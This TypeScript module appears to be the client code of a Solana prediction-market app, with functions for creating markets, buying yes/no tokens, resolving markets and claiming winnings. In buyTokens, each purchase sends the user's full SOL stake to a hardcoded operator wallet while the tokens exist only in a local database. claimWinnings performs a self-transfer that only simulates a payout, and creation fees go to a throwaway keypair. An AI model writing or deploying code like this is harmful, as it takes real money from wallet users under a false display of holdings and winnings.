import { Connection, PublicKey, SystemProgram, LAMPORTS_PER_SOL, Keypair, Transaction } from '@solana/web3.js'
import { useAnchorWallet, useConnection } from '@solana/wallet-adapter-react'
import { useMemo } from 'react'
import BN from 'bn.js'
import { db } from './database'
import { emitPredictionCreated, emitTradeExecuted, emitPredictionResolved } from './realtime'

// Production program ID (will be updated after deployment)
const PROGRAM_ID = new PublicKey('85kBatQcCu7ZFy5YZYBVWa1HKGaWVwiA9jaP9qz4pump')

export interface PredictionAccount {
  creator: PublicKey
  eventDescription: string
  deadline: BN
  oracleSource: string
  createdAt: BN
  totalVolume: BN
  yesSupply: BN
  noSupply: BN
  resolved: boolean
  outcome: boolean | null
  startingOdds: BN
  yesMint: PublicKey
  noMint: PublicKey
  vault: PublicKey
}

export interface UserPosition {
  prediction: PublicKey
  user: PublicKey
  yesTokens: BN
  noTokens: BN
  totalInvested: BN
}

export function useAnchorProgram() {
  const { connection } = useConnection()
  const wallet = useAnchorWallet()

  const program = useMemo(() => {
    if (!wallet) return null

    return {
      programId: PROGRAM_ID,
      connection,
      wallet,
    }
  }, [connection, wallet])

  return { program, wallet, connection }
}

export async function createPrediction(
  connection: Connection,
  wallet: any,
  eventDescription: string,
  deadline: Date,
  oracleSource: string,
  startingOdds: number
) {
  if (!wallet) throw new Error('Wallet not available')

  try {

    
    // Demo mode - create prediction with real SOL transaction
    const predictionKeypair = Keypair.generate()
    const vaultKeypair = Keypair.generate()
    const deadlineTimestamp = Math.floor(deadline.getTime() / 1000)
    
    // Simple transaction to prove wallet connectivity (0.01 SOL creation fee)
    const createTx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: vaultKeypair.publicKey,
        lamports: 0.01 * LAMPORTS_PER_SOL,
      })
    )

    const signature = await wallet.sendTransaction(createTx, connection)
    await connection.confirmTransaction(signature, 'confirmed')

    const predictionData = {
      creator: wallet.publicKey.toString(),
      eventDescription,
      deadline: deadlineTimestamp,
      oracleSource,
      startingOdds,
      yesMint: predictionKeypair.publicKey.toString() + '_yes',
      noMint: predictionKeypair.publicKey.toString() + '_no',
      vault: vaultKeypair.publicKey.toString(),
      yesSupply: 0,
      noSupply: 0,
      totalVolume: 0,
      resolved: false,
      outcome: null,
    }

    const newPrediction = {
      ...predictionData,
      address: predictionKeypair.publicKey.toString(),
      id: predictionKeypair.publicKey.toString(),
      createdAt: Date.now(),
    }
    
    db.savePrediction(newPrediction)
    emitPredictionCreated(newPrediction)


    return {
      signature,
      predictionAddress: predictionKeypair.publicKey.toString(),
      yesMint: predictionData.yesMint,
      noMint: predictionData.noMint,
    }
  } catch (error) {
    console.error('Error creating prediction:', error)
    throw error
  }
}

export async function buyTokens(
  connection: Connection,
  wallet: any,
  predictionAddress: string,
  side: 'yes' | 'no',
  amount: number
) {
  if (!wallet) throw new Error('Wallet not available')

  try {
    console.log('🎯 buyTokens: Starting execution...', { predictionAddress, side, amount })
    
    // Step 1: Validate inputs
    if (!wallet || !wallet.publicKey) {
      throw new Error('Wallet or publicKey not available')
    }
    
    if (!connection) {
      throw new Error('Connection not available')
    }

    // Check wallet balance first
    const balance = await connection.getBalance(wallet.publicKey)
    const requiredLamports = amount * LAMPORTS_PER_SOL
    console.log('💰 Wallet balance:', balance / LAMPORTS_PER_SOL, 'SOL')
    console.log('💰 Required amount:', amount, 'SOL')
    
    if (balance < requiredLamports + 5000) { // 5000 lamports for transaction fees
      throw new Error(`Insufficient SOL balance. Need ${amount} SOL + fees, have ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL`)
    }
    
    // Step 2: Find prediction
    let prediction = db.getPrediction(predictionAddress)
    
    if (!prediction) {
      console.error('❌ Prediction not found:', predictionAddress)
      const allPredictions = db.getPredictions()
      console.log('📋 Available predictions:', allPredictions.map((p: any) => ({ id: p.id, address: p.address })))
      throw new Error(`Prediction not found: ${predictionAddress}`)
    }
    
    console.log('✅ Found prediction:', prediction.eventDescription)

    // Calculate tokens using bonding curve
    const baseLiquidity = 1000
    const totalSupply = prediction.yesSupply + prediction.noSupply + baseLiquidity
    const currentPrice = side === 'yes' 
      ? Math.max(prediction.yesSupply / totalSupply, 0.01)
      : Math.max(prediction.noSupply / totalSupply, 0.01)

    const tokensToMint = amount / currentPrice

    // Step 3: Send SOL to KLIO wallet - Phantom will automatically open
    const KLIO_WALLET = new PublicKey('DNQCaa1XgRnjQES86CwewMLqyT3GLChdv2RrpARTBb7u')
    
    console.log('🔨 Creating transaction to KLIO wallet...')
    const tx = new Transaction()
    
    // Send the full amount to your wallet
    tx.add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: KLIO_WALLET,
        lamports: requiredLamports,
      })
    )

    // Step 4: Send transaction - This will automatically open Phantom
    console.log('📡 Opening Phantom for transaction approval...')
    let signature
    try {
      signature = await wallet.sendTransaction(tx, connection)
      console.log('📡 Transaction sent, signature:', signature)
    } catch (error: any) {
      console.error('❌ Error sending transaction:', error)
      if (error?.message?.includes('User rejected')) {
        throw new Error('Transaction cancelled by user')
      } else if (error?.message?.includes('insufficient')) {
        throw new Error('Insufficient SOL for transaction')
      } else {
        throw new Error(`Transaction failed: ${error?.message || 'Unknown error'}`)
      }
    }

    // Step 5: Confirm transaction
    console.log('⏳ Confirming transaction...')
    try {
      await connection.confirmTransaction(signature, 'confirmed')
      console.log('✅ Transaction confirmed:', signature)
    } catch (error: any) {
      console.error('❌ Error confirming transaction:', error)
      // Don't throw here - transaction might still be valid
      console.log('⚠️ Confirmation timeout, but transaction may be valid')
    }

    // Update prediction state for UI
    db.updatePrediction(predictionAddress, {
      totalVolume: prediction.totalVolume + amount,
      yesSupply: side === 'yes' ? prediction.yesSupply + tokensToMint : prediction.yesSupply,
      noSupply: side === 'no' ? prediction.noSupply + tokensToMint : prediction.noSupply,
    })

    // Save trade record
    const trade = {
      id: `trade_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      predictionId: predictionAddress,
      user: wallet.publicKey.toString(),
      side,
      amount,
      tokensReceived: tokensToMint,
      signature,
      timestamp: Date.now(),
    }
    db.saveTrade(trade)
    emitTradeExecuted(trade)

    // Update user positions for portfolio display
    const existingPositions = db.getUserPositions(wallet.publicKey.toString())
    const existingPosition = existingPositions.find((pos: any) => 
      pos.prediction === predictionAddress
    )

    if (existingPosition) {
      db.savePosition({
        ...existingPosition,
        yesTokens: side === 'yes' ? existingPosition.yesTokens + tokensToMint : existingPosition.yesTokens,
        noTokens: side === 'no' ? existingPosition.noTokens + tokensToMint : existingPosition.noTokens,
        totalInvested: existingPosition.totalInvested + amount,
      })
    } else {
      db.savePosition({
        prediction: predictionAddress,
        user: wallet.publicKey.toString(),
        yesTokens: side === 'yes' ? tokensToMint : 0,
        noTokens: side === 'no' ? tokensToMint : 0,
        totalInvested: amount,
      })
    }

    console.log('✅ Trade completed successfully - SOL sent to KLIO wallet')
    
    return {
      signature,
      tokensReceived: tokensToMint,
      newPrice: calculatePrice(prediction.yesSupply, prediction.noSupply, side),
    }
  } catch (error: any) {
    console.error('Error buying tokens:', error)
    throw error
  }
}

export function calculatePrice(yesSupply: number, noSupply: number, side: 'yes' | 'no'): number {
  const baseLiquidity = 1000
  const totalSupply = yesSupply + noSupply + baseLiquidity
  
  if (side === 'yes') {
    return yesSupply / totalSupply
  } else {
    return noSupply / totalSupply
  }
}

export function getAllPredictions(): any[] {
  return db.getPredictions()
}

export function getUserPositions(userAddress: string): any[] {
  return db.getUserPositions(userAddress)
}

export function lamportsToSol(lamports: BN | number): number {
  const amount = typeof lamports === 'number' ? lamports : lamports.toNumber()
  return amount / LAMPORTS_PER_SOL
}

export function solToLamports(sol: number): BN {
  return new BN(sol * LAMPORTS_PER_SOL)
}

export async function resolvePrediction(
  connection: Connection,
  wallet: any,
  predictionAddress: string,
  outcome: boolean
) {
  if (!wallet) throw new Error('Wallet not available')

  try {
    // For demo purposes, just update localStorage
    const predictions = JSON.parse(localStorage.getItem('predictions') || '[]')
    const predictionIndex = predictions.findIndex((p: any) => p.address === predictionAddress)
    
    if (predictionIndex === -1) throw new Error('Prediction not found')
    
    const prediction = predictions[predictionIndex]
    
    if (prediction.creator !== wallet.publicKey.toString()) {
      throw new Error('Only creator can resolve this prediction')
    }
    
    if (prediction.resolved) {
      throw new Error('Prediction already resolved')
    }

    // Simple transaction to prove wallet connectivity
    const tx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: wallet.publicKey, // Self-transfer
        lamports: 1, // Minimal amount
      })
    )

    const signature = await wallet.sendTransaction(tx, connection)
    await connection.confirmTransaction(signature, 'confirmed')

    // Update prediction state
    prediction.resolved = true
    prediction.outcome = outcome
    predictions[predictionIndex] = prediction
    localStorage.setItem('predictions', JSON.stringify(predictions))

    return signature
  } catch (error) {
    console.error('Error resolving prediction:', error)
    throw error
  }
}

export async function claimWinnings(
  connection: Connection,
  wallet: any,
  predictionAddress: string
) {
  if (!wallet) throw new Error('Wallet not available')

  try {
    const predictions = JSON.parse(localStorage.getItem('predictions') || '[]')
    const prediction = predictions.find((p: any) => p.address === predictionAddress)
    
    if (!prediction) throw new Error('Prediction not found')
    if (!prediction.resolved) throw new Error('Prediction not resolved yet')

    const userPositions = JSON.parse(localStorage.getItem('userPositions') || '[]')
    const position = userPositions.find((pos: any) => 
      pos.prediction === predictionAddress && pos.user === wallet.publicKey.toString()
    )

    if (!position) throw new Error('No position found')

    const winningTokens = prediction.outcome ? position.yesTokens : position.noTokens
    if (winningTokens <= 0) throw new Error('No winning tokens to claim')

    // Calculate payout based on winning tokens and total pool
    const totalWinningTokens = prediction.outcome ? prediction.yesSupply : prediction.noSupply
    const payoutRatio = winningTokens / totalWinningTokens
    const totalPayout = prediction.totalVolume * payoutRatio * 0.95 // 5% platform fee

    // Simple transaction to simulate payout
    const tx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: wallet.publicKey, // Self-transfer for demo
        lamports: Math.floor(totalPayout * LAMPORTS_PER_SOL),
      })
    )

    const signature = await wallet.sendTransaction(tx, connection)
    await connection.confirmTransaction(signature, 'confirmed')

    // Mark position as claimed
    position.claimed = true
    position.payout = totalPayout
    localStorage.setItem('userPositions', JSON.stringify(userPositions))

    return {
      signature,
      payout: totalPayout,
      winningTokens,
    }
  } catch (error) {
    console.error('Error claiming winnings:', error)
    throw error
  }
}